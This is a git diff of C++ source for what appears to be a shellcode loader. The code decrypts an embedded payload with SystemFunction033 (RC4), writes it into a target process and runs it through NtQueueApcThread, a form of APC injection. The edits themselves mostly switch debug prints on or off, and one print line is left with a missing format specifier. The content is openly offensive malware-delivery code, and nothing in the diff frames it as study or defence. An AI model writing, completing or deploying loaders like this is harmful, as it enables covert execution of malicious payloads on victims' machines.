@@ -243,7 +243,7 @@ int main()
 
 //	fprintf(stderr, "Allocated\n");
 
-//	fprintf(stderr, "2.Shellcode size is %d\n", shellcode_size);
+	fprintf(stderr, "2.Shellcode size is %d\n", shellcode_size);
 	std::copy(begin(shellcode), end(shellcode), buf);
 //	fprintf(stderr, "Oofff\n");
 
@@ -252,14 +252,13 @@ int main()
 	key.Length = sizeof(_key);
 	key.MaximumLength = sizeof(_key);
 
-//	fprintf(stderr, "3.Shellcode size is %d\n", shellcode_size);
+//	fprintf(stderr, "3.Shellcode size is \n", shellcode_size);
 
 	_data.Buffer = (PUCHAR)buf;
-	//_data.Length = 0;
 	_data.Length = shellcode_size;
 	_data.MaximumLength = shellcode_size;
-
-	/*
+	
+#ifdef DEBUGGING
 	fprintf(stderr, "Key structure, size %d:\n", sizeof(key));
 	struct ustring *p = &key;
 	unsigned char *c = (unsigned char *)p;
@@ -274,11 +273,11 @@ int main()
 		fprintf(stderr, "0x%02x ", c[i]);
 	}
 	fprintf(stderr, "\n");
-	*/
-
+#endif
+	
 	SystemFunction033(&_data, &key);
 
-//	fprintf(stderr, "Shellcode size is %d\n", shellcode_size);
+	fprintf(stderr, "Shellcode size is %d\n", shellcode_size);
 
 #ifdef DEBUGGING
 	printf("Decrypted, press enter to continue...\n");
@@ -298,7 +297,7 @@ int main()
 	}
 	else {
 #ifdef DEBUGGING
-		fprintf(stderr, "Memory written with encrypted shellcode\n");
+		fprintf(stderr, "Memory written with decrypted shellcode\n");
 		printf("Press enter to continue...\n");
 		getchar();
 #endif
@@ -321,8 +320,8 @@ int main()
 #endif
     }
 
-	//fprintf(stderr, "Memory protected, check with processhacker\n");
-	//getchar();
+	fprintf(stderr, "Memory protected, check with processhacker\n");
+	getchar();
 
     ntstatus = NtQueueApcThread(process_info->hThread, PKNORMAL_ROUTINE(start_address), start_address, NULL, NULL);
     if (!NT_SUCCESS(ntstatus)) {
